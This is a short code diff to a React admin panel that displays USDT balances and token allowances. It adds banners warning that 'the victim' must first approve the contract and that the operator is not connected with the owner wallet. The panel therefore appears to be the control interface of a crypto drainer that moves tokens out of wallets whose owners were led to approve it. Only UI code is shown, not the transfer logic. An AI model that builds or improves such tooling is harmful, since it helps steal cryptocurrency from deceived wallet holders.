@@ -155,6 +155,20 @@ const Admin = () => {
         <p className="text-gray-700 font-medium text-center">USDT Balance: <span className="font-bold">{usdtBalance}</span></p>
         <p className="text-gray-700 font-medium text-center">Allowance: <span className="font-bold">{allowance}</span></p>
       </div>
+
+      {allowance < Number(amount) && Number(amount) > 0 && (
+        <div className="mt-4 p-4 bg-red-100 text-red-700 rounded-lg text-center font-bold">
+          ⚠️ ERROR: Allowance is too low ({allowance}). <br/>
+          The victim MUST approve the contract first.
+        </div>
+      )}
+      
+      {Owner && Connectedadmin && (Owner.toLowerCase() !== Connectedadmin.toLowerCase()) && (
+        <div className="mt-4 p-4 bg-yellow-100 text-yellow-700 rounded-lg text-center font-bold">
+          ⚠️ WARNING: You are not connected with the OWNER wallet. <br/>
+          Owner is: {trimAddreess(Owner)}
+        </div>
+      )}
     </div>
   );
 };
